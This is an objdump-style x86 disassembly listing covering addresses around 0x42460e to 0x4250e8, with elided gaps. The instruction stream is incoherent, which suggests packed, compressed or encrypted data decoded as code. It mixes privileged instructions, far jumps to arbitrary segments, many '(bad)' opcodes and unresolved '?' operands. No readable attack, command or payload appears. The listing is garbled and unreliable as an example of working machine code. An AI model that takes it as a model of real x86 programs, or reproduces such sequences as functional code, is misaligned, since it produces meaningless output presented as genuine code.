  42460e:	xor    BYTE PTR [esi+eax*1],bl
  424611:	aas    
  424612:	xchg   BYTE PTR [eax-0x3136cade],dl
  424618:	lahf   
  424619:	test   esp,eax
  42461b:	jle    0x42460b
  42461d:	idiv   DWORD PTR [edi+esi*2-0x5b]
  424621:	scas   eax,DWORD PTR es:[edi]
  424622:	jae    0x42460f
  424624:	sub    dl,BYTE PTR [edi]
  424626:	imul   ebp,DWORD PTR [esi+0x2cf0f47d],0xad9c1106
  424630:	dec    ecx
  424631:	lahf   
  424632:	jmp    0xba65:0xb8b433f0
  424639:	jnp    0x424607
  42463b:	outs   dx,BYTE PTR ds:[esi]
  42463c:	and    al,0x79
  42463e:	jnp    0x4245c1
  424640:	xor    esp,ebp
  424642:	sbb    cl,BYTE PTR [ebx]
  424644:	adc    DWORD PTR [edx+eiz*1+0x8],ebx
  424648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424649:	std    
  42464a:	xchg   esi,eax
  42464b:	xor    dl,BYTE PTR [eax+0x4c40dee4]
  424651:	mov    bh,0xd5
  424653:	add    BYTE PTR [esi+ecx*8-0x42],0xe6
  424658:	arpl   WORD PTR [edx+0x1387ac44],bx
  42465e:	push   0xfffffffb
  424660:	adc    eax,0xafcb45e
  424665:	loop   0x4245ee
  424667:	aaa    
  424668:	int3   
  424669:	out    0xfd,eax
  42466b:	xchg   ecx,eax
  42466c:	sbb    al,0x40
  42466e:	and    BYTE PTR [ebp+0x74f96e8a],ah
  424674:	sub    ebp,esp
  424676:	out    dx,al
  424677:	pop    esi
  424678:	ds push esp
  42467a:	hlt    
  42467b:	xor    DWORD PTR [ebp-0x3a],ebp
  42467e:	cmp    eax,0x8df98466
  424683:	addr16 (bad) 
  424685:	clc    
  424686:	clc    
  424687:	lds    eax,FWORD PTR [esi+0x42f7835f]
  42468d:	xchg   esp,eax
  42468e:	adc    BYTE PTR [eax+ebp*8+0x2f],bh
  424692:	mov    al,ds:0xc8dc7554
  424697:	cmp    edx,eax
  424699:	cmp    al,0xd0
  42469b:	jae    0x4246e1
  42469d:	mov    ebx,0xf6f46022
  4246a2:	mov    bl,0x23
  4246a4:	(bad)  
  4246a5:	xchg   edx,eax
  4246a6:	lods   al,BYTE PTR ds:[esi]
  4246a7:	test   eax,0x8a88acfd
  4246ac:	test   eax,0xce79f3ee
  4246b1:	leave  
  4246b2:	cmp    edi,DWORD PTR [edx+0xadf8f18]
  4246b8:	hlt    
  4246b9:	retf   0x479
  4246bc:	mov    bh,0x6a
  4246be:	enter  0x7998,0x0
	...
  424732:	add    BYTE PTR [eax],al
  424734:	xor    al,0x23
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fld    QWORD PTR [ebp+0x6ac6611f]
  424745:	test   BYTE PTR [ecx],al
  424747:	add    ch,dh
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [ebp-0x17be5e77],ch
  424751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424752:	cmp    eax,0x4d
  424755:	lods   al,BYTE PTR ds:[esi]
  424756:	jb     0x424785
  424758:	sbb    cl,BYTE PTR [ebp-0x7c]
  42475b:	loop   0x4246f5
  42475d:	cmp    al,0x7c
  42475f:	int3   
  424760:	in     eax,0x71
  424762:	sbb    ecx,ecx
  424764:	lea    eax,[edi+0x3da6c438]
  42476a:	sti    
  42476b:	mov    edx,cr3
  42476e:	add    esi,DWORD PTR [ebx-0xedc5a6a]
  424774:	lods   al,BYTE PTR cs:[esi]
  424776:	loope  0x4247a0
  424778:	aaa    
  424779:	inc    edx
  42477a:	jo     0x424755
  42477c:	dec    edx
  42477d:	jmp    0xa8fcb215
  424782:	or     BYTE PTR [ecx-0x47],0x75
  424786:	test   eax,0x7a1143d0
  42478b:	and    ah,BYTE PTR [ecx-0x6e]
  42478e:	pusha  
  42478f:	or     BYTE PTR [esi-0x4c],ah
  424792:	jl     0x42477c
  424794:	cmc    
  424795:	inc    ecx
  424796:	mov    ebx,0x271ef193
  42479b:	sbb    DWORD PTR [edx],0x6986c915
  4247a1:	push   ss
  4247a2:	xor    DWORD PTR [ebp+0x17029802],ebx
  4247a8:	lds    ebx,FWORD PTR [esi-0x2afe7dcf]
  4247ae:	xlat   BYTE PTR ds:[ebx]
  4247af:	mov    dl,0x5b
  4247b1:	jmp    0x429c7b6d
  4247b6:	mul    BYTE PTR [edi-0x9]
  4247b9:	add    esi,0xffffffb9
  4247bc:	sub    ch,BYTE PTR [edx]
  4247be:	imul   esp,DWORD PTR [edi+0x6b915e3c],0x2f33fbfa
  4247c8:	pop    edx
  4247c9:	push   edi
  4247ca:	lds    eax,FWORD PTR [esi+0x5d]
  4247cd:	test   DWORD PTR [ecx-0x76931430],ebp
  4247d3:	jbe    0x424783
  4247d5:	in     al,0x28
  4247d7:	pop    edi
  4247d8:	jmp    0x8126e8ba
  4247dd:	in     al,0x9d
  4247df:	lock mov dh,0xea
  4247e2:	out    0xa8,eax
  4247e4:	int3   
  4247e5:	cld    
  4247e6:	mov    ds:0x5579d5ee,al
  4247eb:	sub    al,0xc7
  4247ed:	sahf   
  4247ee:	jae    0x42486d
  4247f0:	add    al,0xef
  4247f2:	dec    esp
  4247f3:	sub    ecx,edi
  4247f5:	popf   
  4247f6:	div    DWORD PTR ds:0x57b0cd0a
  4247fc:	dec    edi
  4247fd:	adc    esi,DWORD PTR [ecx]
  4247ff:	hlt    
  424800:	lmsw   bx
  424803:	jle    0x4247fd
  424805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424806:	inc    edx
  424807:	sbb    dl,dh
  424809:	jne    0x4247cb
  42480b:	or     DWORD PTR ds:0x3dcbaba4,ecx
  424811:	and    DWORD PTR [ebx+edx*8+0x20],0xffffffbc
  424816:	enter  0x63f7,0x12
  42481a:	sub    al,0x3
  42481c:	or     al,0x19
  42481e:	cmp    ebp,DWORD PTR [esi+0x25]
  424821:	repnz dec ebp
  424823:	sbb    DWORD PTR [edi+0x4d],esp
  424826:	xchg   edi,eax
  424827:	mov    ebp,0xdb88e936
  42482c:	xchg   esi,eax
  42482d:	outs   dx,DWORD PTR ds:[esi]
  42482e:	aam    0x61
  424830:	jns    0x4247e1
  424832:	ins    DWORD PTR es:[edi],dx
  424833:	rcr    ch,1
  424835:	loop   0x424836
  424837:	sbb    ah,BYTE PTR [ecx-0x6c]
  42483a:	(bad)  [edx]
  42483c:	gs inc eax
  42483e:	dec    edx
  42483f:	sub    al,0xe3
	...
  4248b1:	add    BYTE PTR [eax],al
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424938
  4248c1:	popf   
  4248c2:	aaa    
  4248c3:	ins    DWORD PTR es:[edi],dx
  4248c4:	pop    edi
  4248c5:	test   DWORD PTR [ecx],eax
  4248c7:	add    ch,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    al,al
  4248cd:	adc    eax,0x32c10f6f
  4248d2:	adc    ebp,edx
  4248d4:	lods   eax,DWORD PTR ds:[esi]
  4248d5:	or     al,0x8e
  4248d7:	jns    0x424933
  4248d9:	mov    ds:0x609366cf,eax
  4248de:	cmovp  edx,DWORD PTR [ebx+eiz*2-0x294ff3dd]
  4248e6:	sub    edi,esi
  4248e8:	xchg   BYTE PTR [edi+0x71],cl
  4248eb:	dec    eax
  4248ec:	push   esp
  4248ed:	xor    al,0xdd
  4248ef:	sub    edi,DWORD PTR [ebp-0x133ab0d9]
  4248f5:	jae    0x4248e9
  4248f7:	jno    0x4248ee
  4248f9:	push   ss
  4248fa:	adc    BYTE PTR [ecx-0x3e],0xc3
  4248fe:	sub    bl,BYTE PTR [ebx+0x48]
  424901:	test   ch,dh
  424903:	sbb    al,0x55
  424905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424906:	mov    eax,ds:0x663ae7df
  42490b:	xor    edi,DWORD PTR [eax+0x5d]
  42490e:	dec    ebp
  42490f:	add    DWORD PTR [eax+ecx*4+0x207e442],ebp
  424916:	cmp    edx,DWORD PTR [ebp-0x77468f11]
  42491c:	stos   DWORD PTR es:[edi],eax
  42491d:	js     0x4248bf
  42491f:	adc    eax,0xc4507fa3
  424924:	jmp    0x424905
  424926:	jle    0x424925
  424928:	int    0x4a
  42492a:	rol    ebx,0xf0
  42492d:	xchg   esi,eax
  42492e:	cmp    BYTE PTR [ecx],al
  424930:	xchg   esi,eax
  424931:	rcr    BYTE PTR [edi+0x4fd4ecf],0x6e
  424938:	fs retf 
  42493a:	repnz adc ebx,DWORD PTR ds:0xbeb7160b
  424941:	(bad)  [eax-0x2b9b9f0d]
  424947:	(bad)  
  424949:	sbb    al,0x64
  42494b:	setle  BYTE PTR [ebp-0x62d9fd44]
  424952:	sbb    eax,0x681c74f0
  424957:	rcr    bh,1
  424959:	pop    edx
  42495a:	fs inc ax
  42495d:	or     DWORD PTR [edx-0xbfb9f0a],edi
  424963:	mov    al,cl
  424965:	sub    bh,bh
  424967:	into   
  424968:	dec    BYTE PTR [edx+0x7d43be3c]
  42496e:	jg     0x424926
  424970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424971:	bound  edx,QWORD PTR [eax+ecx*8-0x2b]
  424975:	(bad)  
  424976:	int3   
  424977:	dec    esp
  424978:	pop    ecx
  424979:	lods   eax,DWORD PTR ds:[esi]
  42497a:	cdq    
  42497b:	out    dx,al
  42497c:	jle    0x42492c
  42497e:	in     al,0x9b
  424980:	in     eax,0x6f
  424982:	mov    dl,0x26
  424984:	mov    esi,0x57faa4bd
  424989:	lahf   
  42498a:	out    0xbf,al
  42498c:	popa   
  42498d:	(bad)  
  42498e:	fld    DWORD PTR [eax+0x2]
  424991:	mov    DWORD PTR [eax-0x72ab809e],edx
  424997:	call   0x39a0:0x88c366e5
  42499e:	sti    
  42499f:	jne    0x42495c
  4249a1:	aas    
  4249a2:	cmp    dl,BYTE PTR [esp+ecx*1-0x61]
  4249a6:	test   eax,0x5a0cb185
  4249ab:	retf   
  4249ac:	daa    
  4249ad:	adc    al,0x75
  4249af:	(bad)  
  4249b0:	std    
  4249b1:	and    BYTE PTR [edx-0x2d],cl
  4249b4:	call   0xd52:0xd4da2494
  4249bb:	pop    ecx
  4249bc:	neg    DWORD PTR [ebx]
  4249be:	outs   dx,BYTE PTR ds:[esi]
  4249bf:	cs cwde 
	...
  424a31:	add    BYTE PTR [eax],al
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	or     ah,BYTE PTR [ebx-0x4d]
  424a43:	push   0x54
  424a45:	xchg   BYTE PTR [ecx],al
  424a47:	add    ch,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR ds:0x225356c2,bl
  424a51:	or     eax,0x50c1451a
  424a56:	mov    bh,0x85
  424a58:	shl    esp,0xda
  424a5b:	adc    DWORD PTR [ecx+0x5b],esi
  424a5e:	fistp  DWORD PTR [edi-0x5715060a]
  424a64:	sub    eax,0xf94a3159
  424a69:	or     ebx,DWORD PTR ds:0x72e48dee
  424a6f:	mov    esp,0x5909434
  424a74:	pop    edx
  424a75:	pop    ss
  424a76:	fs (bad) 
  424a78:	push   ss
  424a79:	mov    bl,BYTE PTR [edx+0x45]
  424a7c:	call   0x77c9254b
  424a81:	inc    ecx
  424a82:	aad    0x39
  424a84:	test   al,0xde
  424a86:	into   
  424a87:	je     0x424aae
  424a89:	mov    ebx,0x94d6c454
  424a8e:	popa   
  424a8f:	add    cl,dh
  424a91:	ror    BYTE PTR [edx],cl
  424a93:	pop    ecx
  424a94:	add    dl,ah
  424a96:	jo     0x424b15
  424a98:	or     BYTE PTR [ebp+eax*1-0x38],dh
  424a9c:	and    dh,dl
  424a9e:	mov    dh,0x28
  424aa0:	push   eax
  424aa1:	sbb    DWORD PTR [ebx],eax
  424aa3:	mov    ecx,0x9889becc
  424aa8:	dec    esi
  424aa9:	or     bl,cl
  424aab:	pmullw mm6,QWORD PTR [esi-0x2d]
  424aaf:	mov    bh,0xeb
  424ab1:	enter  0xfdd1,0x2b
  424ab5:	mov    dh,0xa9
  424ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ab8:	sbb    eax,0xe0ece476
  424abd:	pop    ecx
  424abe:	pop    ss
  424abf:	xchg   BYTE PTR [ebx+0x59f708e9],bl
  424ac5:	adc    bh,al
  424ac7:	aas    
  424ac8:	pop    edx
  424ac9:	out    0x7a,eax
  424acb:	sbb    eax,0xba49ffa9
  424ad0:	inc    esi
  424ad1:	gs inc ecx
  424ad3:	scas   eax,DWORD PTR es:[edi]
  424ad4:	out    0xc2,al
  424ad6:	sbb    ebp,DWORD PTR [esi]
  424ad8:	xor    al,0x88
  424ada:	out    0x72,al
  424adc:	mov    edi,0x62736839
  424ae1:	jno    0x424b37
  424ae3:	cmc    
  424ae4:	jae    0x424b4a
  424ae6:	fild   WORD PTR [esi+0x72]
  424ae9:	inc    BYTE PTR [ebx*4-0x7aa87309]
  424af0:	dec    eax
  424af1:	mov    ds,WORD PTR [edi+eiz*4-0x3c]
  424af5:	imul   ebx,edi,0x2d323811
  424afb:	inc    eax
  424afc:	icebp  
  424afd:	sub    edi,eax
  424aff:	push   edx
  424b00:	pop    esp
  424b01:	jmp    0x424ac3
  424b03:	je     0x424af8
  424b05:	xlat   BYTE PTR ds:[ebx]
  424b06:	call   DWORD PTR [esi]
  424b08:	jae    0x424ac2
  424b0a:	sbb    al,0x77
  424b0c:	in     al,dx
  424b0d:	add    al,0xe1
  424b0f:	aam    0x74
  424b11:	sbb    bh,BYTE PTR [eax-0x4d]
  424b14:	adc    ebx,0xffffff9b
  424b17:	(bad)  
  424b18:	aam    0xd5
  424b1a:	fdivr  QWORD PTR [edx]
  424b1c:	pusha  
  424b1d:	leave  
  424b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b1f:	inc    ecx
  424b20:	add    DWORD PTR [ebp-0x9],0x3219f71c
  424b27:	hlt    
  424b28:	cwde   
  424b29:	lods   eax,DWORD PTR ds:[esi]
  424b2a:	sub    bh,cl
  424b2c:	add    esi,ebx
  424b2e:	sub    al,0xff
  424b30:	(bad)  
  424b31:	sub    dh,BYTE PTR [edx-0x5d]
  424b34:	and    eax,0x17a8e3d3
  424b39:	imul   edi,DWORD PTR [esi],0x64dca06e
  424b3f:	and    eax,0xb
	...
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx+0x6f46077f]
  424bc1:	lds    ebp,FWORD PTR [edx]
  424bc3:	jnp    0x424c0e
  424bc5:	xchg   DWORD PTR [ecx],eax
  424bc7:	add    ch,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [eax+0x33],ch
  424bce:	mov    esp,0x88518e81
  424bd3:	in     al,0x5c
  424bd5:	adc    esp,DWORD PTR [eax+0x17]
  424bd8:	js     0x424b5d
  424bda:	jnp    0x424c3d
  424bdc:	or     edi,DWORD PTR [ebx+0x7c]
  424bdf:	xchg   BYTE PTR [ecx-0x4e1dde5e],ah
  424be5:	cmp    dh,bh
  424be7:	mov    dl,0xed
  424be9:	or     DWORD PTR [ebp-0x489abbac],eax
  424bef:	xor    dh,al
  424bf1:	out    0xac,eax
  424bf3:	mov    ch,0xc0
  424bf5:	mov    edx,0xefbcac41
  424bfa:	lahf   
  424bfb:	or     esp,ebp
  424bfd:	push   0xa1566658
  424c02:	retf   0x1bd1
  424c05:	fcom   QWORD PTR [ebx+0x47e0e1ff]
  424c0b:	xchg   DWORD PTR [ecx+0x1f910143],ebp
  424c11:	shl    DWORD PTR [ebp+edx*4-0x1428fc9b],cl
  424c18:	not    BYTE PTR [eax+0x67d86ca1]
  424c1e:	pushf  
  424c1f:	aas    
  424c20:	jg     0x424c27
  424c22:	xor    ah,BYTE PTR [ecx]
  424c24:	mov    BYTE PTR [edx-0x49],al
  424c27:	std    
  424c28:	out    0xa4,eax
  424c2a:	div    esi
  424c2c:	ins    DWORD PTR es:[edi],dx
  424c2d:	in     eax,0xd8
  424c2f:	test   eax,0x2a12a605
  424c34:	add    DWORD PTR [esi-0x40aae028],esi
  424c3a:	retf   0x6cb8
  424c3d:	add    eax,0x26e9f126
  424c42:	je     0x424c13
  424c44:	outs   dx,DWORD PTR ds:[esi]
  424c45:	xor    BYTE PTR [ebp+0x16],al
  424c48:	stos   DWORD PTR es:[edi],eax
  424c49:	xchg   BYTE PTR [edi-0x21],al
  424c4c:	dec    ebx
  424c4d:	mov    dl,0x64
  424c4f:	pop    ss
  424c50:	idiv   BYTE PTR [ebx-0x4426e347]
  424c56:	(bad)  
  424c57:	pop    ds
  424c58:	cmp    BYTE PTR [eax*2+0x425b8ff0],bh
  424c5f:	rcr    BYTE PTR [eax-0x23711b],0xb9
  424c66:	lock rcr BYTE PTR ds:[esi],0xd5
  424c6b:	sub    eax,DWORD PTR [edx+0xb0056fe]
  424c71:	stc    
  424c72:	mov    cl,0x30
  424c74:	mov    ecx,0x7036aa5f
  424c79:	ficom  WORD PTR [ecx-0x60d87d4f]
  424c7f:	loopne 0x424cf8
  424c81:	arpl   WORD PTR [edx-0x32],cx
  424c84:	xchg   esi,eax
  424c85:	ss retf 0xa613
  424c89:	add    edi,esp
  424c8b:	push   edi
  424c8c:	xchg   ebx,eax
  424c8d:	xchg   ecx,eax
  424c8e:	retf   
  424c8f:	push   eax
  424c90:	stos   BYTE PTR es:[edi],al
  424c91:	hlt    
  424c92:	not    DWORD PTR [eax+0x1932a4d1]
  424c98:	jns    0x424ca5
  424c9a:	jnp    0x424ccb
  424c9c:	jl     0x424c8a
  424c9e:	add    al,al
  424ca0:	pop    edi
  424ca1:	xor    BYTE PTR [ebp+0x50],bl
  424ca4:	dec    edx
  424ca5:	pop    edx
  424ca6:	out    0x99,eax
  424ca8:	xchg   edx,eax
  424ca9:	cs mov bl,0xd5
  424cac:	sub    eax,0xa337e9bb
  424cb1:	mov    dl,0x72
  424cb3:	scas   al,BYTE PTR es:[edi]
  424cb4:	mov    al,0xff
  424cb6:	(bad)  
  424cb7:	nop
  424cb8:	rcl    BYTE PTR [ebp+0x5f824ea7],0x54
  424cbf:	out    0x32,al
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x27aa94d7]
  424d42:	adc    edi,DWORD PTR [ecx]
  424d44:	mov    BYTE PTR ds:[ecx],al
  424d47:	add    ch,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    cl,bh
  424d4d:	xor    esp,DWORD PTR [edx+0xd]
  424d50:	popa   
  424d51:	clc    
  424d52:	stos   DWORD PTR es:[edi],eax
  424d53:	js     0x424d66
  424d55:	inc    esp
  424d56:	mov    cl,0x24
  424d58:	xor    ch,cl
  424d5a:	cs jle 0x424cf5
  424d5d:	jbe    0x424d8b
  424d5f:	dec    edx
  424d60:	mov    BYTE PTR [esi],ah
  424d62:	mov    edx,0x628c8987
  424d67:	pushf  
  424d68:	or     ecx,DWORD PTR [esi]
  424d6a:	xchg   ebx,eax
  424d6c:	push   es
  424d6d:	shl    DWORD PTR [ebx-0x298fc9cf],0xfb
  424d74:	mov    bl,0x80
  424d76:	ret    
  424d77:	and    DWORD PTR [edx-0x47271ea3],esp
  424d7d:	jae    0x424d0e
  424d7f:	mov    edx,0x3b3d49e7
  424d84:	fucomip st,st(4)
  424d86:	pushf  
  424d87:	ss retf 0x2014
  424d8b:	mov    dh,BYTE PTR [ecx+0x603a7b1]
  424d91:	pop    es
  424d92:	lods   eax,DWORD PTR ds:[esi]
  424d93:	pop    edx
  424d94:	mov    bh,0x68
  424d96:	mov    bh,cl
  424d98:	push   esi
  424d99:	sub    ebp,DWORD PTR [ebx+0x6322ea48]
  424d9f:	jg     0x424d93
  424da1:	mov    ds:0xa49e65e7,al
  424da6:	mov    DWORD PTR [edx+ebx*1-0xb34b103],eax
  424dad:	retf   0xa816
  424db0:	dec    edx
  424db1:	xor    DWORD PTR [ecx+0x3b],ecx
  424db4:	cmp    ah,BYTE PTR [ebx]
  424db6:	daa    
  424db7:	inc    ebp
  424db8:	pop    ebp
  424db9:	xchg   al,bh
  424dbb:	jmp    0xb6aa:0x412a7ac1
  424dc2:	push   edi
  424dc3:	push   ecx
  424dc4:	mov    al,0x82
  424dc6:	std    
  424dc7:	test   DWORD PTR [ecx],0x55703a67
  424dcd:	mov    ah,0x64
  424dcf:	rcl    DWORD PTR [ebp+ebp*8-0x4a],cl
  424dd3:	outs   dx,DWORD PTR ds:[esi]
  424dd4:	sub    cl,BYTE PTR [eax+eax*4]
  424dd7:	jae    0x424dba
  424dd9:	ret    0xa916
  424ddc:	jge    0x424e0f
  424dde:	stos   DWORD PTR es:[edi],eax
  424ddf:	imul   ebx,ebx,0x53
  424de2:	retf   
  424de3:	inc    ebp
  424de4:	outs   dx,BYTE PTR ds:[esi]
  424de5:	mov    ss,WORD PTR [edi+0xa]
  424de8:	call   0x5d6e91f2
  424ded:	mov    al,0x37
  424def:	jecxz  0x424e5c
  424df1:	std    
  424df2:	cwde   
  424df3:	mov    BYTE PTR [esi],bh
  424df5:	loop   0x424db5
  424df7:	out    dx,al
  424df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424df9:	in     al,dx
  424dfa:	jno    0x424d7f
  424dfc:	jmp    0x5298:0x760792a9
  424e03:	dec    edx
  424e04:	or     ch,BYTE PTR [edx+0x2913a215]
  424e0a:	push   ds
  424e0b:	loope  0x424de5
  424e0d:	mov    cl,0x6e
  424e0f:	jo     0x424e61
  424e11:	int    0xe7
  424e13:	inc    edx
  424e14:	sub    al,0x8f
  424e16:	add    al,BYTE PTR ds:0x8809be02
  424e1c:	sub    ch,BYTE PTR [edx-0x7a]
  424e1f:	shr    DWORD PTR [esi-0x62be1204],1
  424e25:	adc    BYTE PTR [ebp-0xd],ch
  424e28:	xor    al,0x3d
  424e2a:	mov    ?,WORD PTR [edx]
  424e2c:	cli    
  424e2d:	pop    esp
  424e2e:	ret    0xc3b8
  424e31:	xchg   ebp,eax
  424e32:	ins    DWORD PTR es:[edi],dx
  424e33:	nop
  424e34:	fstp   DWORD PTR [edi-0xbc5b6ce]
  424e3a:	mov    ebp,0xa969fa7a
  424e3f:	cld    
  424e40:	push   es
	...
  424eb1:	add    BYTE PTR [eax],al
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	sbb    eax,0x33af5ad7
  424ec5:	mov    DWORD PTR [ecx],eax
  424ec7:	add    ch,dh
  424ec9:	add    BYTE PTR [eax],al
  424ecb:	add    BYTE PTR [ebp-0x67],al
  424ece:	mov    bl,0x62
  424ed0:	cmp    al,0x6c
  424ed2:	adc    bl,BYTE PTR [edi]
  424ed4:	dec    ecx
  424ed5:	push   esi
  424ed6:	sti    
  424ed7:	fcomp  DWORD PTR [eax+0x42]
  424eda:	push   es
  424edb:	rcl    DWORD PTR [ecx-0x50],1
  424ede:	hlt    
  424edf:	mov    edx,0x3f9bd7ca
  424ee4:	push   edi
  424ee5:	iret   
  424ee6:	(bad)  
  424ee7:	jmp    0xb7b6abe4
  424eec:	popa   
  424eed:	inc    ebx
  424eee:	iret   
  424eef:	sub    dh,BYTE PTR [ecx-0x4d]
  424ef2:	and    al,0xbd
  424ef4:	cmp    DWORD PTR [esi+0x28],0xea15e05e
  424efb:	retw   
  424efd:	out    0x61,eax
  424eff:	add    eax,0xaebcf5a2
  424f04:	sub    eax,0xd6c920be
  424f09:	adc    esp,DWORD PTR ds:0x4b76358f
  424f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f10:	stos   DWORD PTR es:[edi],eax
  424f11:	loope  0x424edf
  424f13:	adc    eax,0x6b23a3e5
  424f18:	jecxz  0x424f7b
  424f1a:	pop    edx
  424f1b:	adc    al,0x93
  424f1d:	cdq    
  424f1e:	test   BYTE PTR [ebp-0x107379a4],0xee
  424f25:	pop    eax
  424f26:	pushf  
  424f27:	push   edx
  424f28:	sub    DWORD PTR [ecx+0xa686ea9],ebx
  424f2e:	and    BYTE PTR [ebx],0xfa
  424f31:	xlat   BYTE PTR ds:[ebx]
  424f32:	add    eax,0xe3d48ee5
  424f37:	in     eax,dx
  424f38:	ins    DWORD PTR es:[edi],dx
  424f39:	cwde   
  424f3a:	jle    0x424ef1
  424f3c:	pop    ss
  424f3d:	je     0x424ecf
  424f3f:	into   
  424f40:	ins    BYTE PTR es:[edi],dx
  424f41:	xor    BYTE PTR [ecx+0x5e50d142],dl
  424f47:	cwde   
  424f48:	mov    ebp,0x6d188a7f
  424f4d:	or     esp,esi
  424f4f:	sub    bl,al
  424f51:	loope  0x424f85
  424f53:	dec    edx
  424f54:	fwait
  424f55:	push   ebp
  424f56:	dec    esi
  424f57:	icebp  
  424f58:	arpl   WORD PTR [ecx+eax*8+0x68116702],si
  424f5f:	or     eax,0x365ef62c
  424f64:	retf   0x73dd
  424f67:	sbb    dh,BYTE PTR [ebx+0x6c]
  424f6a:	dec    ecx
  424f6b:	pop    ebp
  424f6c:	pop    ss
  424f6d:	pop    ebp
  424f6e:	dec    esp
  424f6f:	xchg   esi,eax
  424f70:	inc    bx
  424f72:	mov    ds:0x3ffac167,al
  424f77:	ds mov eax,0x9c56b4cd
  424f7d:	out    0xce,eax
  424f7f:	mov    dh,0x2a
  424f81:	mov    ah,0xd1
  424f83:	rol    BYTE PTR [ebx+edx*2-0x52],0x7
  424f88:	adc    ebx,DWORD PTR [ebx]
  424f8a:	xor    BYTE PTR [ebx+0x79],dl
  424f8d:	clc    
  424f8e:	push   ds
  424f8f:	jmp    0xdb26:0x3d66444f
  424f96:	and    edi,DWORD PTR [ebx]
  424f98:	mov    eax,0x58b1bff7
  424f9d:	xchg   ebp,eax
  424f9e:	jmp    0x5a038162
  424fa3:	adc    dl,BYTE PTR [esi]
  424fa5:	lods   eax,DWORD PTR ds:[esi]
  424fa6:	xor    al,0x64
  424fa8:	test   al,0xc3
  424faa:	xchg   esp,eax
  424fab:	mov    ebx,0xcb35fdc
  424fb0:	mov    ?,WORD PTR [ecx-0x14]
  424fb3:	sti    
  424fb4:	sbb    al,0x46
  424fb6:	sbb    DWORD PTR [ecx],edi
  424fb8:	push   ebx
  424fb9:	mov    cl,0x61
  424fbb:	cli    
  424fbc:	shr    al,cl
  424fbe:	mov    BYTE PTR [ebp-0x45],dh
	...
  425031:	add    BYTE PTR [eax],al
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	xchg   BYTE PTR [ebx],bl
  425042:	jb     0x42503a
  425044:	sub    BYTE PTR [edx+0xf50001],cl
  42504a:	add    BYTE PTR [eax],al
  42504c:	inc    esp
  42504d:	push   0x31
  42504f:	pop    esi
  425050:	cmp    edi,DWORD PTR [ecx+ebp*1-0x6e3bed73]
  425057:	fs push edi
  425059:	enter  0xe2a7,0x3c
  42505d:	sbb    DWORD PTR [ecx+0x519f4a15],ecx
  425063:	inc    esi
  425064:	pusha  
  425065:	add    ecx,edi
  425067:	adc    edx,DWORD PTR [ebx+0x2]
  42506a:	pop    esp
  42506b:	lea    edi,[esi]
  42506d:	stos   BYTE PTR es:[edi],al
  42506e:	fwait
  42506f:	jns    0x425080
  425071:	sub    al,0xd5
  425073:	add    eax,0xd4185a4f
  425078:	ret    
  425079:	ror    DWORD PTR [edx],0x9e
  42507c:	cmp    al,0xd4
  42507e:	pop    ss
  42507f:	imul   ebx,eax,0x99daca03
  425085:	into   
  425086:	cld    
  425087:	inc    esi
  425088:	and    al,0xa
  42508a:	lds    ebp,FWORD PTR [ebp-0x16]
  42508d:	xchg   esi,eax
  42508e:	add    al,0x6f
  425090:	xchg   ebx,ebp
  425092:	sub    eax,0xcbcbd03
  425097:	sub    al,0xa9
  425099:	add    DWORD PTR [edx+0x46435424],ecx
  42509f:	call   0xe3ff607c
  4250a4:	daa    
  4250a5:	cmp    eax,0x12293194
  4250aa:	loope  0x4250d9
  4250ac:	lods   eax,DWORD PTR ds:[esi]
  4250ad:	add    al,0xcc
  4250af:	retf   
  4250b0:	sar    BYTE PTR ds:0xb87de773,1
  4250b6:	lea    edx,[ebp+0x49]
  4250b9:	cdq    
  4250ba:	cs xchg esp,eax
  4250bc:	ins    BYTE PTR es:[edi],dx
  4250bd:	sub    DWORD PTR [edx-0x50],0xffffffee
  4250c1:	loopne 0x425111
  4250c3:	scas   al,BYTE PTR es:[edi]
  4250c4:	mov    DWORD PTR [esi-0x3d],edx
  4250c7:	test   al,0xfa
  4250c9:	mov    esi,0xceebada4
  4250ce:	mov    ebp,0x5ce6fac
  4250d3:	pop    esp
  4250d4:	cli    
  4250d5:	mov    edx,0x8804fe44
  4250da:	gs mov ah,0x28
  4250dd:	ins    DWORD PTR es:[edi],dx
  4250de:	jle    0x42510f
  4250e0:	jmp    0x83f20c4f
  4250e5:	loope  0x425107
  4250e7:	inc    ecx
  4250e8:	int    0xdc
